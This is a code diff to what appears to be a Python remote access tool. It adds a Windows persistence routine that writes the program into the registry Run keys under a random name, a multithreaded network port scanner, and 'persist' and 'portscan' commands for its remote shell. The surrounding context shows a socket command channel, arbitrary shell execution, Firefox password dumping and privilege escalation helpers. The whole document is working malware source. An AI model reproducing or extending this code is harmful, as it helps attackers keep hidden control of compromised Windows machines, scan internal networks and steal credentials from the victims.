@@ -14,6 +14,7 @@ import hashlib
 import getpass
 import ctypes
 import sys
+import string
 
 if os.name == "nt":
 	import passdump
@@ -298,7 +299,11 @@ class Transport:
 		try:
 			data = ""
 			while not data.endswith(chr(255)):
-				data += self.comm_socket.recv(4096)
+				temp = self.comm_socket.recv(4096)
+				if not temp:
+					data = None
+					break
+				data += temp
 			data = data[:-1]
 		except: data = ""
 		
@@ -436,6 +441,23 @@ class Miscellaneous:
 		for line in execute.execute_shell_command("whoami /groups")[1].splitlines():
 			if "S-1-5-32-544" in line: # S-1-5-32-544 is a well-known identifier for the admin group
 				return line.split()[0].split("\\")[1]
+				
+	@windows_only
+	def persist(self):
+		random_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
+		if self.isadmin():
+			retval = subprocess.Popen("reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
+			retval.communicate()
+
+			if retval.returncode == 0:
+				return "Succesfully added file to registry for local machine."
+		else:
+			retval = subprocess.Popen("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "+str(random_name) + ' /t REG_SZ /d "'+os.path.abspath(sys.executable) +'" /f', shell=True)
+			retval.communicate()
+			if retval.returncode == 0:
+				return "Succesfully added file to current user's registry."
+				
+		return "Failed to add file to registry."
 		
 class Privilege_Escalation:
 	"""
@@ -494,13 +516,93 @@ class Information_Gathering:
 	def dump_firefox(self):
 		return passdump.dump_firefox()
 		
-	
+class Networking:
+	"""
+	Network discovery, port scans, etc.
+	"""
+	def scan_host(self, host, ports, q):
+		logging.debug("Starting portscan of host "+host+", ports: "+str(ports))
+		random.shuffle(ports)
+		for port in ports:
+			try:
+				s = socket.socket()
+				s.settimeout(0.7)
+				s.connect((host, int(port)))
+				q.put((host, port))
+			except:
+				continue
+				
+	def portscan(self, hosts, ports):
+		q = Queue.Queue()
+		host_list = []
+		port_list = []
+		for i in ports.split(","):
+			try:
+				if '-' not in i:
+					port_list.append(i)
+				else:
+					a, b = map(int, i.split('-'))
+					port_list += range(a, b+1)
+			except:
+				return "Invalid port range"
+				
+		if not port_list or port_list[0] == []:
+			return "Invalid port range"
+				
+		host_range = ".".join(hosts.split(".")[:3])
+		try:
+			for i in hosts.split(","):
+				print i
+				print hosts.split(".")
+				if '-' not in i.split(".")[3]:
+					host_list.append(host_range+"."+str(i.split(".")[3]))
+				else:
+					a, b = map(int, i.split(".")[3].split('-'))
+					for c in range(a, b+1):
+						host_list.append(host_range+"."+str(c))
+		except Exception as e:
+			return "Invalid host range"
+			
+		if not host_list or host_list[0] == []:
+			return "Invalid host range"
+				
+		threads = []
+		for host in host_list:
+			t = threading.Thread(target=self.scan_host, args=(host, port_list, q))
+			t.daemon = True
+			t.start()
+			threads.append(t)
+			
+		for t in threads:
+			t.join()
+			
+		open = []
+		while not q.empty():
+			open.append(q.get())
+			
+		hosts = {}
+		for host, port in open:
+			if host not in hosts:
+				hosts[host] = str(port)
+			else:
+				hosts[host] += ","+str(port)
+			
+		out = ""
+		for host in hosts:
+			out += host+":\n"
+			for port in set(sorted(hosts[host].split(","))):
+				out += "  "+str(port)+" OPEN\n"
+			out += "\n"
+			
+		return out # This is absolutely horrible but I don't see how it can be improved
+		
 		
 execute = Execute()
 fs = Filesystem()
 misc = Miscellaneous()
 privesc = Privilege_Escalation()
 info = Information_Gathering()
+net = Networking()
 	
 class Shell:
 	"""
@@ -553,6 +655,14 @@ help - This menu!
 			elif data.startswith("download"):
 				file = data.split()[1]
 				output = fs.download(file, self.transport)
+			elif data == "persist":
+				output = misc.persist()
+			elif data.startswith("portscan"):
+				try:
+					hosts, ports = data.split()[1], data.split()[2]
+					output = net.portscan(hosts, ports)
+				except Exception as e:
+					output = str(e)+"\nusage: portscan [host_range] [port_range]"
 			else:
 				output = execute.execute_shell_command(data)[1]
 				
@@ -575,5 +685,4 @@ while True:
 			
 if __name__ == "__main__":
 	main()
-
-
+	
